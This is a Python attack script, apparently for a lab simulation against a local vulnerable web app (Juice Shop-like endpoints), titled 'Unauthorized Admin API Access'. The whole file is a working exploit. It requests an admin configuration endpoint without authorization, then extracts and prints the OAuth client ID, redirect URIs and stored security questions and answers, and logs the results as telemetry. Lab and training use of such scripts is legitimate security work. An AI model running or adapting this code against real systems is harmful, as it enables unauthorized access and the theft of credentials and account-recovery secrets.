import requests
import json
from datetime import datetime


# ============================================================
# SMARTCITY-X
# Attack #5: Unauthorized Admin API Access
# ============================================================

TARGET = "http://127.0.0.1:3000"
ENDPOINT = "/rest/admin/application-configuration"

URL = TARGET + ENDPOINT

# Burp Suite Community Edition
BURP_PROXY = "http://127.0.0.1:8080"

TELEMETRY_FILE = "api_telemetry.json"


print("=" * 60)
print("        SMARTCITY-X API ATTACK SIMULATION")
print("=" * 60)

print(f"Target: {TARGET}")
print(f"Endpoint: {ENDPOINT}")
print("Method: GET")
print("Tool: Burp Suite Proxy")
print()


# ============================================================
# ATTACK
# ============================================================

print("[ATTACK] Sending unauthorized API request...")
print("[ATTACK] Routing request through Burp Suite...")


try:

    response = requests.get(
        URL,
        proxies={
            "http": BURP_PROXY,
            "https": BURP_PROXY
        },
        timeout=10
    )

except requests.RequestException as e:

    print()
    print("[ERROR] Could not connect to target.")
    print(f"[ERROR] {e}")
    exit()


# ============================================================
# RESPONSE
# ============================================================

print()
print("-" * 60)
print("                    API RESPONSE")
print("-" * 60)

print(f"[RESPONSE] HTTP Status: {response.status_code}")
print(f"[RESPONSE] Response Size: {len(response.content)} bytes")
print("[RESPONSE] Authorization Header: NOT PROVIDED")

print()


# ============================================================
# PARSE JSON
# ============================================================

try:

    data = response.json()

except ValueError:

    print("[ERROR] Server did not return valid JSON.")
    exit()


# ============================================================
# ACCESS CONFIG
# ============================================================

config = data.get("config", {})


# ============================================================
# SERVER CONFIGURATION
# ============================================================

server = config.get("server", {})

server_port = server.get("port")
base_url = server.get("baseUrl")


# ============================================================
# APPLICATION CONFIGURATION
# ============================================================

application = config.get("application", {})

application_name = application.get("name")
application_domain = application.get("domain")
local_backup = application.get("localBackupEnabled")
show_version = application.get("showVersionNumber")


# ============================================================
# DISPLAY EXPOSED CONFIGURATION
# ============================================================

print("-" * 60)
print("           EXPOSED ADMINISTRATIVE CONFIGURATION")
print("-" * 60)

print(f"Application Name    : {application_name}")
print(f"Application Domain  : {application_domain}")
print(f"Server Port         : {server_port}")
print(f"Base URL            : {base_url}")
print(f"Version Display     : {show_version}")
print(f"Local Backup Enabled: {local_backup}")


# ============================================================
# CHATBOT CONFIGURATION
# ============================================================

chatbot = application.get("chatBot")

if chatbot is None:
    chatbot = config.get("chatBot", {})

if isinstance(chatbot, dict):

    chatbot_name = chatbot.get("name")

    if chatbot_name:

        print(f"Chatbot Name        : {chatbot_name}")


# ============================================================
# GOOGLE OAUTH CONFIGURATION
# ============================================================

google_oauth = config.get("googleOauth", {})

oauth_configuration_exposed = False
oauth_redirect_entries = 0

if isinstance(google_oauth, dict) and google_oauth:

    oauth_configuration_exposed = True

    print()
    print("[!] OAuth Configuration Exposed")

    client_id = google_oauth.get("clientId")

    if client_id:

        print(f"OAuth Client ID     : {client_id}")

    authorized_redirects = google_oauth.get(
        "authorizedRedirects",
        []
    )

    if isinstance(authorized_redirects, list):

        oauth_redirect_entries = len(
            authorized_redirects
        )

        print(
            f"OAuth Redirect Entries: "
            f"{oauth_redirect_entries}"
        )

        # Display first few redirect URIs
        for entry in authorized_redirects[:3]:

            if isinstance(entry, dict):

                uri = entry.get("uri")

                if uri:
                    print(f"    -> {uri}")


# ============================================================
# SECURITY-RELATED DATA
# ============================================================

print()
print("-" * 60)
print("             SECURITY-RELATED DATA")
print("-" * 60)


memories = config.get("memories", [])

security_related_data_exposed = False

security_fields = [
    "geoStalkingMetaSecurityQuestion",
    "geoStalkingMetaSecurityAnswer",
    "geoStalkingVisualSecurityQuestion",
    "geoStalkingVisualSecurityAnswer"
]


if isinstance(memories, list):

    for memory in memories:

        if not isinstance(memory, dict):
            continue

        found_fields = []

        for field in security_fields:

            if field in memory:

                found_fields.append(field)

        if found_fields:

            security_related_data_exposed = True

            print()

            for field in found_fields:

                print(f"{field}: {memory[field]}")


# ============================================================
# ATTACK RESULT
# ============================================================

print()
print("-" * 60)
print("                    ATTACK RESULT")
print("-" * 60)


unauthorized_access = False
admin_configuration_exposed = False


if response.status_code == 200:

    unauthorized_access = True
    admin_configuration_exposed = True

    print("[+] API request successful")
    print("[!] Administrative configuration returned")
    print("[!] Configuration returned without Authorization header")

else:

    print(
        f"[-] API request returned HTTP "
        f"{response.status_code}"
    )


if oauth_configuration_exposed:

    print("[!] OAuth configuration exposed")


if security_related_data_exposed:

    print("[!] Security-related application data exposed")


# ============================================================
# TELEMETRY
# ============================================================

telemetry = {

    "timestamp": datetime.now().isoformat(),

    "target": TARGET,

    "host": "127.0.0.1",

    "port": 3000,

    "protocol": "HTTP",

    "endpoint": ENDPOINT,

    "method": "GET",

    "burp_proxy": BURP_PROXY,

    "authorization_header": False,

    "http_status": response.status_code,

    "response_size_bytes": len(response.content),

    "unauthorized_access":
        unauthorized_access,

    "admin_configuration_exposed":
        admin_configuration_exposed,

    "application_name_exposed":
        application_name is not None,

    "application_domain_exposed":
        application_domain is not None,

    "server_port_exposed":
        server_port is not None,

    "base_url_exposed":
        base_url is not None,

    "oauth_configuration_exposed":
        oauth_configuration_exposed,

    "oauth_redirect_entries":
        oauth_redirect_entries,

    "security_related_data_exposed":
        security_related_data_exposed,

    "impact":
        "ADMINISTRATIVE_CONFIGURATION_EXPOSURE",

    "attack":
        "UNAUTHORIZED ADMIN API ACCESS"
}


# ============================================================
# SAVE TELEMETRY
# ============================================================

try:

    with open(
        TELEMETRY_FILE,
        "w",
        encoding="utf-8"
    ) as file:

        json.dump(
            telemetry,
            file,
            indent=4
        )

    print()
    print("[+] API telemetry saved")
    print(
        f"[+] Telemetry: "
        f"{TELEMETRY_FILE}"
    )

except Exception as e:

    print()
    print("[ERROR] Could not save telemetry.")
    print(f"[ERROR] {e}")


# ============================================================
# COMPLETE
# ============================================================

print()
print("=" * 60)
print("             API ATTACK SIMULATION COMPLETE")
print("=" * 60)